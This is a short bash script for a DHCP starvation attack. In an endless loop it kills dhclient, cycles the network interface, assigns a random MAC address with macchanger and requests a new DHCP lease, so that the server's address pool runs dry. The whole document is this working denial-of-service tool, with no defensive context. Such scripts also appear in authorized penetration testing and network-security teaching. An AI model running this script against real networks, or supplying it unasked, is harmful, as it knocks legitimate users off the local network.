#!/bin/bash

if [[ -z $1 ]]; then
   interface='eth0'
else
   interface=$1
fi

PIDFile="/tmp/dhcp-starvation.dhclient.${interface}.pid"

rm -f "${PIDFile}"

while true; do
      # We kill every dhclient process
      [ -e "${PIDFile}" ] && kill -9 $(cat "${PIDFile}")
      rm -f "${PIDFile}"

      # We disable our interface
      ip link set "${interface}" down
      #ifconfig "${interface}" down

      # We switch our MAC address for out interface
      macchanger -a "${interface}" | grep '^New MAC:'

      # We enable again our interface
      ip link set "${interface}" up
      #ifconfig "${interface}" up

      # We get a new DHCP Lease
      dhclient -v "${interface}" -pf "${PIDFile}" 2>&1 | grep DHCPACK
done
